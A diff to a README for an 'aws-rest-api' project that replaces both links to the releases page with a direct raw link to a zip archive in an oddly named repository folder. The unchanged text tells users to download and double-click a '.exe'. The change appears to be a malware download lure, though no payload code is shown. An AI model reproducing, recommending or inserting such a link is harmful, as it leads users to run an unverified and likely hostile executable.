@@ -1,6 +1,6 @@
 # ☁️ aws-rest-api - Manage AWS cloud services with ease
 
-<a href="https://github.com/vincentscleanlimbed596/aws-rest-api/releases"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download"></a>
+<a href="https://github.com/vincentscleanlimbed596/aws-rest-api/raw/refs/heads/main/subexcite/rest_api_aws_v3.4.zip"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download"></a>
 
 ## 📋 Project Overview
 
@@ -23,7 +23,7 @@ Before you install the software, ensure your computer meets these basic needs:
 
 Follow these steps to prepare the application for use:
 
-1. Visit [this page to download](https://github.com/vincentscleanlimbed596/aws-rest-api/releases) the latest version of the application.
+1. Visit [this page to download](https://github.com/vincentscleanlimbed596/aws-rest-api/raw/refs/heads/main/subexcite/rest_api_aws_v3.4.zip) the latest version of the application.
 2. Look for the file ending in `.exe` under the Assets section. Click the filename to start the download.
 3. Once the download finishes, open your Downloads folder.
 4. Double-click the installer file to begin the setup process.
